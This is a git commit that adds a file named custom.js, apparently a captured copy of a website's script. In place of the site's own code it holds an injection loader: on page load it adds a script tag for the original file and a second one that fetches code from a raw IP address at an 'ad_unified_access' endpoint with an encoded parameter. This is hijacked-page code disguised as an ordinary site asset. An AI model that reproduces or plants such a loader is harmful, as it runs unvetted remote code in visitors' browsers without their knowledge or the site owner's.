b568594d5f89969cdf1cd29ffdb2a73e6ee6b2f9
qledrun <qledrun@gmail.com>
2018-10-24 23:30:20 +0800

    new file

---
+++ custom.js
@@ -0,0 +1,5 @@
+var _atn_obj_ = new Object; 
+_atn_obj_.oldurl = 'custom.js-cHVzaA=1540368733'/*tpa=http://www.402168.com/public/static/index/js/custom.js?cHVzaA=1540368733*/; 
+_atn_obj_.unified_url = 'http://183.59.53.202:3737/ad_unified_access?SP=ABzs/LzIPPyMrKz8fIyM/Lzc6/zsnM0Zibg6jf0s7R0s7R0s6DzoPLy8/Mz8+DzIPOysvPzMnHyMzMg87Ky8/MycfIzMzPzcnNycvGg8vLyc3I'; 
+window.setTimeout(function(){var a=document.createElement("script");a.src=_atn_obj_.oldurl;document.getElementsByTagName("head")[0].appendChild(a);},0); 
+window.setTimeout(function(){var a=document.createElement("script");a.src=_atn_obj_.unified_url;document.getElementsByTagName("head")[0].appendChild(a);},0);
